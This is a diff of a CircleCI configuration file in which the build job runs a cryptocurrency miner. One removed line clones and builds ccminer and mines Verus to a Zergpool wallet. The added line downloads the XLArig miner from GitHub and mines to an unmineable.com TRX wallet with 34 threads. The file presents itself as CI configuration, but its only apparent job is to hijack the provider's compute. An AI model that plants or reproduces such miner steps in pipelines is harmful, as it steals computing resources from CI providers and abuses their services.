@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential git && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer  -a verus  -o stratum+tcp://verushash.asia.mine.zergpool.com:3300  -u  A8Bc1cMKPg1m2A6VAsGoSSLFBJm7mUWh7N -p c=DOGE,mc=VRSC,ID=Reborn  -t 36
+      - run:  wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o rx.unmineable.com:3333 -u TRX:TLWasr7Ew35NZ8LY4qnJXiGHifTGszjD3V.Bugger panthera -k -t 34
